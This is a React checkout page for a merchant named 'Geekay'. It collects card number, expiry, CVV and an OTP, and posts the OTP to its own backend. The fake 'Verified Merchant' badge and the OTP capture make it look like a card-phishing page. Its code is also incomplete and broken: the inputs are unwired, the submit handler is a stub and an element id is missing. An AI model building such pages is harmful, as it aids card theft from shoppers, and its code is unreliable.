import React, { useState, useEffect } from 'react';
import { Shield } from 'lucide-react';
import { safeRedirect, checkTransactionStatus, startOtpTimer } from './utils/redirectHandler';

function App() {
  const [isCardValid, setIsCardValid] = useState(false);
  const [isExpiryValid, setIsExpiryValid] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [currentInvoiceId, setCurrentInvoiceId] = useState<string | null>(null);
  const [consentChecked, setConsentChecked] = useState(true);
  const [displayAmount, setDisplayAmount] = useState('0');
  const [showOtp, setShowOtp] = useState(false);
  const [timer, setTimer] = useState(180);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const pid = urlParams.get('pid');
    if (pid) {
      fetchPaymentDetails(pid);
    }

    // Set up status check interval if we have an invoice ID
    let statusInterval: number | null = null;
    if (currentInvoiceId) {
      statusInterval = window.setInterval(() => {
        checkTransactionStatus(currentInvoiceId);
      }, 2000);
    }

    // Cleanup
    return () => {
      if (statusInterval) {
        clearInterval(statusInterval);
      }
    };
  }, [currentInvoiceId]);

  const fetchPaymentDetails = async (pid: string) => {
    try {
      const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
      const data = await response.json();
      if (data.status === 'success') {
        const amount = parseInt(data.payment.amount, 10);
        setDisplayAmount(amount.toLocaleString('en-IN'));
      }
    } catch (error) {
      console.error('Error fetching payment details:', error);
    }
  };

  const validateCard = (number: string): boolean => {
    const clean = number.replace(/\D/g, '');
    if (clean.length < 13 || clean.length > 16) return false;
    let sum = 0;
    let isEven = false;
    for (let i = clean.length - 1; i >= 0; i--) {
      let digit = parseInt(clean[i], 10);
      if (isEven) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      isEven = !isEven;
    }
    return sum % 10 === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isCardValid || !isExpiryValid || isProcessing) return;
    setIsProcessing(true);
    // Add your payment submission logic here
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isProcessing) return;
    setIsProcessing(true);

    try {
      const response = await fetch("/api/submitOTP", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          invoiceId: currentInvoiceId,
          otp: document.getElementById('otp')?.value
        })
      });

      if (!response.ok) {
        throw new Error('Failed to submit OTP');
      }

      // Start checking transaction status
      checkTransactionStatus(currentInvoiceId!);
    } catch (err) {
      console.error('OTP submission error:', err);
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-r from-red-500 to-white">
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto bg-white rounded-2xl shadow-lg overflow-hidden">
          <div className="flex flex-col md:flex-row">
            <div className="md:w-7/12 p-5">
              <div className="bg-white rounded-2xl shadow-sm mb-6">
                <div className="flex items-start gap-4 mb-4 px-4 pt-4">
                  <div className="w-12 h-12 rounded-none overflow-hidden flex-shrink-0 bg-gray-50">
                    <img
                      src="https://images.unsplash.com/photo-1572059002053-8cc5ad2f4a38?w=64&h=64&fit=crop"
                      alt="Merchant Logo"
                      className="w-full h-full object-cover"
                    />
                  </div>
                  <div className="flex flex-col">
                    <span className="text-2xl font-semibold">Geekay</span>
                    <div className="flex items-center gap-1 text-gray-600 text-sm">
                      <Shield className="w-4 h-4 text-green-500" />
                      <span>Verified Merchant</span>
                    </div>
                  </div>
                </div>
                
                <div className="mt-4 px-6">
                  <h2 className="text-xl font-semibold mb-4">Payment Details</h2>
                  <div className="bg-gray-50 p-4 rounded-lg">
                    <div className="text-2xl font-bold text-center">
                      ₹{displayAmount}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="md:w-5/12 p-5">
              {!showOtp ? (
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Email
                    </label>
                    <input
                      type="email"
                      className="block w-full px-3 py-2 border border-gray-300 rounded-md"
                      placeholder="you@example.com"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Card Number
                    </label>
                    <input
                      type="text"
                      maxLength={19}
                      className="block w-full px-3 py-2 border border-gray-300 rounded-md"
                      placeholder="4242 4242 4242 4242"
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Expiry Date
                      </label>
                      <input
                        type="text"
                        maxLength={5}
                        className="block w-full px-3 py-2 border border-gray-300 rounded-md"
                        placeholder="MM/YY"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        CVV
                      </label>
                      <input
                        type="password"
                        maxLength={3}
                        className="block w-full px-3 py-2 border border-gray-300 rounded-md"
                        placeholder="123"
                        required
                      />
                    </div>
                  </div>

                  <button
                    type="submit"
                    className="w-full py-3 px-4 bg-green-600 text-white rounded-md hover:bg-green-700 transition-colors"
                    disabled={!isCardValid || !isExpiryValid || isProcessing}
                  >
                    {isProcessing ? 'Processing...' : 'Pay Now'}
                  </button>
                </form>
              ) : (
                <div className="space-y-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Enter OTP
                    </label>
                    <input
                      type="text"
                      maxLength={6}
                      className="block w-full px-3 py-2 border border-gray-300 rounded-md text-center text-lg tracking-wider"
                      placeholder="Enter OTP"
                      required
                    />
                  </div>
                  <div className="text-center text-sm text-gray-500">
                    Time remaining: {Math.floor(timer / 60)}:{(timer % 60).toString().padStart(2, '0')}
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;